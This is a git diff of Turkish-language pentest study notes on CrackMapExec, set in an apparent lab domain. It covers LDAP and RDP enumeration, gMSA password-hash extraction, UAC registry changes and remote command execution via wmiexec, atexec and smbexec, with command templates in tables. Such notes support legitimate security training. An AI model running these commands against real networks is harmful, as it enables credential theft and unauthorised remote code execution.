-Windows Yönetim Araçları'nın (WMI) birincil kullanım alanlarından biri, sınıf ve örnek bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm nesneleri döndürmesini isteyebiliriz.
+[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
 
-WMI, TCP port 135 ve bir dizi dinamik port kullanır: 49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri), TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.
 
-Örneğin, remote bir bilgisayarda Sysmon uygulamasının çalışıp çalışmadığını sorgulamak ve Caption ve ProcessId'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%' şeklindedir:
+WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+
+Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:
 
 
 ### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma
-![Pasted image 20241202210123.png](/img/user/resimler/Pasted%20image%2020241202210123.png)
 
-WMI, sınıflarını hiyerarşik bir ad alanında düzenler. Bir sorgu gerçekleştirmek için, Class Name (Sınıf Adı) ve içinde bulunduğu Namespace'i (Ad Alanı) bilmemiz gerekir. Yukarıdaki örnekte, root\cimv2 namespace'indeki Win32_Process sınıfını sorgulayın. Namespace belirtmedik çünkü varsayılan olarak CME root\cimv2 kullanır (bu bilgiyi --help menüsünde görebiliriz)
+{{CODE_BLOCK_135}}
 
-Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, root\WMI namespace'inde bulunan MSPower_DeviceEnable sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
+WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).
+
+Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
 
 
 ### Quering root\WMI Namespace
-![Pasted image 20241202212300.png](/img/user/resimler/Pasted%20image%2020241202212300.png)
-![Pasted image 20241202212343.png](/img/user/resimler/Pasted%20image%2020241202212343.png)
 
-Not: Genellikle, WMI'yı sorgulamak için yönetici ayrıcalıklarına sahip olmamız gerekir, ancak bir yönetici, WMI'yı sorgulamak için yönetici olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için yönetici olmayan bir hesap kullanabiliriz.
+{{CODE_BLOCK_136}}
 
-WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için Microsoft'un Belgelerini okuyabiliriz.
+Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.
+
+WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.
+
+
 
 Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.
 
+----
+
 
 ### LDAP and RDP Enumeration
-Daha önce, CrackMapExec'te en çok kullanılan protokol olan SMB ile bazı numaralandırma seçeneklerini inceledik, ancak LDAP ve RDP protokolleri ile daha fazla numaralandırma seçeneği vardır
+
+Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır
 
 Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir
 
-
 ### LDAP & RDP Commands
+
 LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:
-![Pasted image 20241202225531.png](/img/user/resimler/Pasted%20image%2020241202225531.png)
-![Pasted image 20241202225542.png](/img/user/resimler/Pasted%20image%2020241202225542.png)
 
-Henüz çalışmadıklarımızı gözden geçirelim.
+| Komut                                                                          | Açıklama                                                                                           |
+| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |
 
+Henüz çalışmadıklarımız varsa onları gözden geçirelim.
 
 ### Enumerating Users and Groups
 
-SMB protokolünde yaptığımız gibi, LDAP ile de kullanıcıları ve grupları listeleyebiliriz:
+SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:
 
 ### Enumerating Users and Groups
 
-![Pasted image 20241202225710.png](/img/user/resimler/Pasted%20image%2020241202225710.png)
-![Pasted image 20241202225721.png](/img/user/resimler/Pasted%20image%2020241202225721.png)
-![Pasted image 20241202225733.png](/img/user/resimler/Pasted%20image%2020241202225733.png)
-![Pasted image 20241202225743.png](/img/user/resimler/Pasted%20image%2020241202225743.png)
+{{CODE_BLOCK_137}}
 
-Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir
+Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir
 
 
 ### İlginç Hesap Özelliklerini Numaralandırma
 
-ldap protokolü, PASSWD_NOTREQD veya TRUSTED_FOR_DELEGATION bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta adminCount değeri 1 olan tüm hesapları sorgulayabiliriz.
+`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.
 
-PASSWD_NOTREQD hesap denetimi özniteliği ayarlanmışsa, kullanıcı geçerli parola ilkesi uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir ( domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için --password-notrequired seçeneğini kullanabiliriz.
-
-
-### PASSWD_NOTREQD Özniteliğinin Tanımlanması
-
-![Pasted image 20241202230116.png](/img/user/resimler/Pasted%20image%2020241202230116.png)
-![Pasted image 20241202230124.png](/img/user/resimler/Pasted%20image%2020241202230124.png)
-
-TRUSTED_FOR_DELEGATION özniteliği ayarlanırsa, bir hizmetin altında çalıştığı hizmet hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani hizmeti talep eden bir istemciyi taklit edebilir. Bu saldırı türüne Kerberos Unconstrained Delegation adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
-
-### Kısıtlamasız Delegasyonun Belirlenmesi
-![Pasted image 20241202230729.png](/img/user/resimler/Pasted%20image%2020241202230729.png)
-
-adminCount özniteliği, SDProp işleminin bir kullanıcıyı koruyup korumadığını belirler. Bu işlemde, Active Directory'deki AdminSDHolder, korunan kullanıcı hesaplarının ACL izinleri için bir şablon görevi görür. Herhangi bir ACE hesabı değiştirilirse (örneğin, bir saldırgan tarafından), bu işlem tarafından korunan hesapların ACL izinleri, SDProp işlemi her çalıştığında şablon izin kümesine sıfırlanır; bu varsayılan olarak her 60 dakikada bir yapılır ancak değiştirilebilir. Değer 0 olarak ayarlanmışsa veya belirtilmemişse kullanıcı kapsam dışıdır. Öznitelik değeri 1 olarak ayarlanırsa kullanıcı korunur. Saldırganlar genellikle dahili bir ortamda hedef almak için adminCount özniteliği 1 olarak ayarlanmış hesapları ararlar. Bunlar genellikle ayrıcalıklı hesaplardır ve daha fazla erişime veya domain'in tamamen ele geçirilmesine yol açabilir.
+`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.
 
 
-### adminCount Özniteliğini Sorgulama
-![Pasted image 20241202230901.png](/img/user/resimler/Pasted%20image%2020241202230901.png)
-![Pasted image 20241202230911.png](/img/user/resimler/Pasted%20image%2020241202230911.png)
-![Pasted image 20241202230921.png](/img/user/resimler/Pasted%20image%2020241202230921.png)
+### PASSWD_NOTREQD Attribute Tanımlanması
+
+{{CODE_BLOCK_138}}
+
+`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
+
+### Unconstrained Delegation Belirlenmesi
+
+{{CODE_BLOCK_139}}
+
+`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.
+
+
+### adminCount Attribute'u Sorgulama
+
+{{CODE_BLOCK_140}}
 
 
 ### Domain SID'sini numaralandırma
 
-Bazı domain saldırıları, kullanıcı veya domain SID'si gibi belirli domain bilgilerini edinmemizi gerektirir. SID (Security IDentifier), bir bilgisayarın veya domain controller'ın sizi tanımlamak için kullandığı benzersiz bir kimlik numarasıdır. Domain sid, domain'i tanımlayan benzersiz bir kimlik numarasıdır. CrackMapExec kullanarak domain sid'sini almak için --get-sid bayrağını kullanabiliriz:
+Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:
 
+### Domain SID'i Toplama
 
-### Gathering the Domain SID
-
-![Pasted image 20241202231106.png](/img/user/resimler/Pasted%20image%2020241202231106.png)
-![Pasted image 20241202231112.png](/img/user/resimler/Pasted%20image%2020241202231112.png)
+{{CODE_BLOCK_141}}
 
 
 ### Group Managed Service Accounts (gMSA)
@@ -14075,138 +15046,158 @@ Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA
 * Basitleştirilmiş service principal name (SPN) yönetimi.
 * Yönetimi diğer yöneticilere devretme yeteneği
 
-Bu yönetilen hizmet hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
+Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
 
 Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.
 
 Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):
 
-
 ### Enumerating Accounts with gMSA Privileges
-![Pasted image 20241202231402.png](/img/user/resimler/Pasted%20image%2020241202231402.png)
-![Pasted image 20241202231409.png](/img/user/resimler/Pasted%20image%2020241202231409.png)
 
-Yukarıdaki örnekte, engels kullanıcısının PrincipalsAllowedToRetrieveManagedPassword ayrıcalığına sahip olduğunu görebiliriz, bu da svc_inlaneadm$ gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın NTLM parola hash'ini almak için --gmsa seçeneğini kullanabiliriz.
+{{CODE_BLOCK_142}}
+
+
+Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.
 
 
 ### gMSA Parolasını Edinme
-![Pasted image 20241202231528.png](/img/user/resimler/Pasted%20image%2020241202231528.png)
+
+{{CODE_BLOCK_143}}
 
 Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.
 
-
 ### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme
-![Pasted image 20241202231553.png](/img/user/resimler/Pasted%20image%2020241202231553.png)
-![Pasted image 20241202231601.png](/img/user/resimler/Pasted%20image%2020241202231601.png)
 
+{{CODE_BLOCK_144}}
+
+
+---
 
 ### RDP Screenshots
-RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca NLA ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için --nlascreenshot seçeneğini kullanabiliriz
+
+RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz
 
 
 ### Enumerate Login Prompt
-![Pasted image 20241202231656.png](/img/user/resimler/Pasted%20image%2020241202231656.png)
+
+{{CODE_BLOCK_145}}
 
 Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.
 
 
-### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
-![Pasted image 20241202231729.png](/img/user/resimler/Pasted%20image%2020241202231729.png)
+### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma
+
+{{CODE_BLOCK_146}}
+
 ![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)
 
-Eğer bir kullanıcı adı ve parolamız varsa, --screenshot seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek --screentime ile birleştirilebilir, varsayılan olarak 10, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
+Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
 
-Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen --res seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek 1024x768 olarak ayarlanmıştır
-
-
-
-### Taking a Screenshot
-![Pasted image 20241202232439.png](/img/user/resimler/Pasted%20image%2020241202232439.png)
-![Pasted image 20241202232444.png](/img/user/resimler/Pasted%20image%2020241202232444.png)
+Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır
 
 
-Not: --screentime ve --res isteğe bağlı bayraklardır.
+### Screenshot Alma
+
+{{CODE_BLOCK_147}}
+
+
+Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.
 
 Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:
 
 
 ### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
-![Pasted image 20241202232517.png](/img/user/resimler/Pasted%20image%2020241202232517.png)
+
+{{CODE_BLOCK_148}}
+
 ![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)
 
-
-Bu bölümde, hedeflerimizi arşivlemeye yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini araştırdık. Bir sonraki bölümde CrackMapExec kullanarak komutların nasıl çalıştırılacağı incelenecektir.
-
+Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.
 
 
-
+---
 
 ### Command Execution
 
-Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce UAC'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca RID 500'e sahip yönetici hesabı (varsayılan yönetici) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
+Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
 
-![Pasted image 20241203095807.png](/img/user/resimler/Pasted%20image%2020241203095807.png)
+`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
+`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`
 
-Varsayılan olarak, LocalAccountTokenFilterPolicy değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) yönetim görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si 500 ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm yönetici hesapları yönetim görevlerini yürütebilir.
+Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.
 
-Yöneticinin yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) uzaktan yönetim görevlerini yerine getirmesini engellemektir. Bu, FilterAdministratorToken kayıt defteri değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (uzaktan yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
+Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
 
 
+### Administrator Olarak Komut Yürütme
 
-### Command Execution as Administrator
-Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
+Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
 
 
 ### Bir Komutu Administrator Olarak Çalıştırma
-![Pasted image 20241203100035.png](/img/user/resimler/Pasted%20image%2020241203100035.png)
-![Pasted image 20241203100045.png](/img/user/resimler/Pasted%20image%2020241203100045.png)
+
+{{CODE_BLOCK_149}}
 
 
-### RID 500 Dışı Hesap Olarak Komut Yürütme
-Yukarıdaki komutta, localadmin local user Administrators grubundadır, ancak uzak komutu çalıştıramaz:
+### RID 500 Olmayan Hesap Olarak Komut Yürütme
+
+Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:
 
 ### Komutu localadmin olarak çalıştırma
-![Pasted image 20241203100238.png](/img/user/resimler/Pasted%20image%2020241203100238.png)
 
-Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap yönetici olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, LocalAccountTokenFilterPolicy'yi 1 olarak ayarlayabiliriz.
+{{CODE_BLOCK_150}}
+
+Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.
 
 
 ### LocalAccountTokenFilterPolicy'yi Değiştirme
-![Pasted image 20241203100321.png](/img/user/resimler/Pasted%20image%2020241203100321.png)
 
-![Pasted image 20241203100458.png](/img/user/resimler/Pasted%20image%2020241203100458.png)
+{{CODE_BLOCK_151}}
+
+
+{{CODE_BLOCK_152}}
 
 
 ### Domain Hesabı Olarak Komut Yürütme
-LocalAccountTokenFilterPolicy yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve administrators grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, INLANEFREIGHT\robert hesabı administrators grubunun bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
+
+`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
 
 
 ### Komutu Robert olarak çalıştır
-![Pasted image 20241203100627.png](/img/user/resimler/Pasted%20image%2020241203100627.png)
+
+{{CODE_BLOCK_153}}
 
 
 ### SMB ile Komut Yürütme
-CME'nin dört (4) farklı komut yürütme yöntemi vardır:
-![Pasted image 20241203101103.png](/img/user/resimler/Pasted%20image%2020241203101103.png)
 
-Not: Tüm yöntemler tüm bilgisayarlarda çalışmayabilir.
+CME'nin dört (4) farklı komut yürütme yöntemi vardır:
+
+| Komut   | Açıklama                                                                                                                             |
+| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
+| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
+| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
+| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
+| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |
+
+Not: Her yöntem her bilgisayarda çalışmayabilir.
 
 Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:
 
-![Pasted image 20241203101142.png](/img/user/resimler/Pasted%20image%2020241203101142.png)
+* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec
 
-CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin --exec-method bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
+CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
 
 
 ### SMBExec Yöntemi ile Komut Yürütme
-![Pasted image 20241203101223.png](/img/user/resimler/Pasted%20image%2020241203101223.png)
+
+{{CODE_BLOCK_154}}
 
 Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:
 
-
 ### wmiexec aracılığıyla PowerShell Komut Yürütme
-![Pasted image 20241203101403.png](/img/user/resimler/Pasted%20image%2020241203101403.png)
-![Pasted image 20241203101435.png](/img/user/resimler/Pasted%20image%2020241203101435.png)
+
+{{CODE_BLOCK_155}}
+
 
 PowerShell seçeneği -X çalıştırıldığında, perde arkasında CrackMapExec aşağıdakileri yapacaktır:
 
@@ -15591,235 +16582,261 @@ Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP
 {{CODE_BLOCK_121}}
 
 ### drop-sc Modülü ile Hash'lerin Çalınması
